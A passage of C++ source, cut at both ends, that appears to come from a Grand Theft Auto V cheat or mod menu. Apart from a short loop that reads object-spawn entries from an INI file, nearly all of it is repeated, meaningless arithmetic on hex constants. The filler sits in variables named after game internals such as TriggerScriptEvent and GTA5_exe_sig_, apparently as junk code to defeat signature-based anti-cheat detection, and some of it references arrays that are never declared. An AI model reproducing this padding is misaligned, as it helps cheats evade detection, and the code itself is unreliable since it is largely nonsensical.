		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		Spawn_Struct Spawn;
		Extern_Reader::INIFile::INIFilePath = INIPath;
		for (int i = 1; i <= 1000; i++)
		{
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
			if (Modelo == "")
			{
				i = 1000;
			}
			else
			{
				Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
				Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");
				Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");
				Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");
				Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");
				Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");
				Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");
				Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
